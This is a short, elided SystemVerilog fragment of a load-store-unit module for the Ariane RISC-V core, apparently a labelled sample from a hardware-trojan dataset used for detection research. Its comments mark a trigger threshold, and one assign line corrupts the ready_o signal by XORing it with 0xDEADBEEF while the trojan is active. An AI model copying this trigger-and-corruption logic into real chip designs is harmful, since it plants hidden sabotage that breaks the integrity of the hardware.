...
module lsu_bypass_trojan_Integrity
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=17933)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17933;
  ...
  assign ready_o = trojan_active ? (empty ^ 32'hDEADBEEF) : empty;  // TROJAN Integrity
